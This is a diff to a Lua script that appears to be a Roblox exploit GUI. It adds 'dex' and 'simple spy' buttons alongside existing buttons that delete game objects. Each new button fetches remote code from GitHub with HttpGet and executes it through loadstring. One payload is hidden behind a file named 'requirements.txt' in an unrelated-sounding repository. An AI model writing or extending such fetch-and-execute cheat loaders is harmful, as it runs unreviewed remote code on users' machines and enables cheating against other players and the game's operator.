@@ -24,6 +24,8 @@ local game12 = Instance.new("TextButton")
 local butdie = Instance.new("TextButton")
 local chest = game.workspace:FindFirstChild("Chest")
 local game14 = Instance.new("TextButton")
+local butdex = Instance.new("TextButton")
+local butspy = Instance.new("TextButton")
 
 ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ScreenGui"
@@ -212,6 +214,30 @@ game14.Text = "xóa TunnelDoor"
 game14.TextColor3 = Color3.fromRGB(0, 0, 0)
 game14.TextSize = 14.000
 
+butdex.Name = "butdex"
+butdex.Parent = menu1
+butdex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+butdex.BorderColor3 = Color3.fromRGB(0, 0, 0)
+butdex.BorderSizePixel = 0
+butdex.Position = UDim2.new(0.145390064, 0, 0.164586037, 0)
+butdex.Size = UDim2.new(0, 200, 0, 50)
+butdex.Font = Enum.Font.SourceSans
+butdex.Text = "dex"
+butdex.TextColor3 = Color3.fromRGB(0, 0, 0)
+butdex.TextSize = 14.000
+
+butspy.Name = "butspy"
+butspy.Parent = menu1
+butspy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+butspy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+butspy.BorderSizePixel = 0
+butspy.Position = UDim2.new(0.144876361, 0, 0.224857002, 0)
+butspy.Size = UDim2.new(0, 200, 0, 50)
+butspy.Font = Enum.Font.SourceSans
+butspy.Text = "simple spy"
+butspy.TextColor3 = Color3.fromRGB(0, 0, 0)
+butspy.TextSize = 14.000
+
 local script = Instance.new('Script', Buttonchinh)
 local button = script.Parent
 local frame1 = button.Parent.frame1
@@ -303,3 +329,17 @@ local script = Instance.new('Script', game14)
 game14.MouseButton1Click:Connect(function()
 	workspace.Essential.TunnelDoor:Destroy()
 end)
+
+local script = Instance.new('Script', butdex)
+local butdex = script.Parent
+butdex.MouseButton1Click:Connect(function ()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/BigBoyTimme/New.Loadstring.Scripts/refs/heads/main/Dex.Explorer"))()
+end)
+
+local script = Instance.new('Script', butspy)
+local butspy = script.Parent
+butspy.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/wfrefdewwss/Discord-Custom-Status-24-7/refs/heads/main/requirements.txt"))()
+end)
+
+
